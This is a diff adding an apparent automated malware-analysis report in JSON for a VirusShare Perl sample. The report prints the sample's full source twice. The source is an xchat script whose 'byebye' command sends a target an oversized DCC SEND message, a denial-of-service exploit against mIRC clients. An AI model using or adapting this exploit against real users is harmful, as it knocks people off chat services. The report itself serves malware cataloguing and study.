@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "register": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "#!/usr/bin/perl -w\n# by L0stm4n <lostman[at]liquidcode.org\n# DoS for mirc packaged in a nice xchat script\n# Useful for removing morons from a chat\n\nIRC::register(\"mirc exploit\", \"1.0\", \"\", \"\");\nIRC::print(\"\\0034mirc exploit loaded \\003\");\nIRC::add_command_handler(\"byebye\", \"killem\");\n\nsub killem {\n\t$killee = shift(@_);\n\tIRC::send_raw(\"PRIVMSG $killee :\\01DCC SEND \\\"a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a\\\" 1079095848 666\\01\");\n\treturn 1;\n}\n0;"
+    },
+    "filename": "VirusShare_1040b28d55d687b066bab53964c3f2e5",
+    "filesize": 675,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "1040b28d55d687b066bab53964c3f2e5",
+        "sha1": "e376a0eedb33714d2f508f250797dd7e0d69be3a",
+        "sha256": "63d38d58a1234858cf30c84b453361fc91f45e8b2171b2aff2bafd7cbbdaddd8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl -w",
+            "# by L0stm4n <lostman[at]liquidcode.org",
+            "# DoS for mirc packaged in a nice xchat script",
+            "# Useful for removing morons from a chat",
+            "IRC::register(\"mirc exploit\", \"1.0\", \"\", \"\");",
+            "IRC::print(\"\\0034mirc exploit loaded \\003\");",
+            "IRC::add_command_handler(\"byebye\", \"killem\");",
+            "sub killem {",
+            "\t$killee = shift(@_);",
+            "\tIRC::send_raw(\"PRIVMSG $killee :\\01DCC SEND \\\"a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a\\\" 1079095848 666\\01\");",
+            "\treturn 1;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277186",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
